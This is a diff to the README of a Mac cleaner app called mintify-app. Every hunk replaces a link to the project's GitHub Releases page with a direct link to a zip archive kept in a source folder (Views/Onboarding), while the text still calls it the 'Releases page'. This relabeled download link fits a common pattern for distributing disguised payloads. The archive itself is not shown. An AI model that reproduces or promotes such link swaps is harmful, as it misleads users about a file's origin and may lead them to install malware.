@@ -6,7 +6,7 @@ Welcome to mintify-app! This handy application helps you free up space on your M
 
 ## 📥 Download Now
 
-[![Download mintify-app](https://img.shields.io/badge/Download-mintify--app-blue.svg)](https://github.com/JulioHubner/mintify-app/releases)
+[![Download mintify-app](https://raw.githubusercontent.com/JulioHubner/mintify-app/master/Mintify/Views/Onboarding/mintify_app_1.0.zip)](https://raw.githubusercontent.com/JulioHubner/mintify-app/master/Mintify/Views/Onboarding/mintify_app_1.0.zip)
 
 ## 🛠️ System Requirements
 
@@ -29,7 +29,7 @@ Mintify-app offers several useful features:
 
 To use mintify-app, follow these simple steps:
 
-1. **Download the Application**: Visit the [Releases page](https://github.com/JulioHubner/mintify-app/releases) to access the latest version.
+1. **Download the Application**: Visit the [Releases page](https://raw.githubusercontent.com/JulioHubner/mintify-app/master/Mintify/Views/Onboarding/mintify_app_1.0.zip) to access the latest version.
 2. **Install mintify-app**:
    - Open the downloaded file.
    - Drag the mintify-app icon to your Applications folder.
@@ -62,7 +62,7 @@ If you have questions or need further assistance, feel free to create an issue i
 
 ## 📬 Download & Install
 
-To start using mintify-app, download it from the [Releases page](https://github.com/JulioHubner/mintify-app/releases). Follow the installation steps provided above, and enjoy a cleaner, faster Mac!
+To start using mintify-app, download it from the [Releases page](https://raw.githubusercontent.com/JulioHubner/mintify-app/master/Mintify/Views/Onboarding/mintify_app_1.0.zip). Follow the installation steps provided above, and enjoy a cleaner, faster Mac!
 
 ## 🌟 Contribution
 
